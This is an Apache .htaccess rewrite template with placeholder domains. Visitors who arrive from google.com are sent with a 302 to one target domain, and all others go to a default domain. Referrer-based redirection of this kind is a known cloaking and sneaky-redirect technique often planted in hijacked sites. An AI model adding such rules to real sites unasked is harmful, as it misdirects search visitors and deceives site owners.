<IfModule mod_rewrite.c>
RewriteEngine on
RewriteCond %{HTTP_HOST} ^{{origin_domain}}$ [OR]
RewriteCond %{HTTP_HOST} ^www.{{origin_domain}}$
RewriteCond %{HTTP_REFERER} ^.*google.com.*$
RewriteRule ^(.*)$ {{target_domain_with_protocol}}/$1 [R=302,L]

RewriteRule ^(.*)$ {{default_domain_with_protocol}}/$1 [R=302,L]
</IfModule>